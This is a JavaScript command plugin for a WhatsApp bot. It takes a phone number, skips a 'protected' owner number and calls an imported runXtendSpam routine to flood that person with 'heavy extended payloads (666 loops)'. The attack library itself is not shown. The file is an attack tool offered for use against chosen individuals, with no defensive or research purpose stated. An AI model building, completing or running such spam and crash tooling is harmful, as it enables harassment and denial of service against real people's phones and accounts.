let { runXtendSpam } = require('../lib/rizouxtend');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Xtend Command!*');

    if (!args[0]) {
        return m.reply(`📌 *Usage:* .${command} 923xx`);
    }

    let pepec = (args[0] || "").replace(/[^0-9]/g, "");

    if (!pepec) {
        return m.reply('❌ *Invalid number format!*');
    }

    let protectedNumbers = ["923154734548"];
    if (protectedNumbers.includes(pepec)) {
        return m.reply('🔒 *This number is protected!*');
    }

    let target = pepec + '@s.whatsapp.net';

    await m.reply(`🔥 *inRespXtend Target Locked:* ${pepec}\n⚡ *Spamming heavy extended payloads (666 loops)...*`);

    try {
        runXtendSpam(conn, target);
        await conn.sendMessage(m.chat, { react: { text: "💥", key: m.key } });
    } catch (error) {
        console.error("Xtend Plugin Error:", error);
        m.reply("⚠️ Error: inRespXtend execute karte waqt masla aaya hai.");
    }
}

handler.command = ['xtend', 'rizouxtend', 'inrespext'];
handler.tags = ['owner', 'rizo'];
handler.help = ['xtend 923xx'];
module.exports = handler;
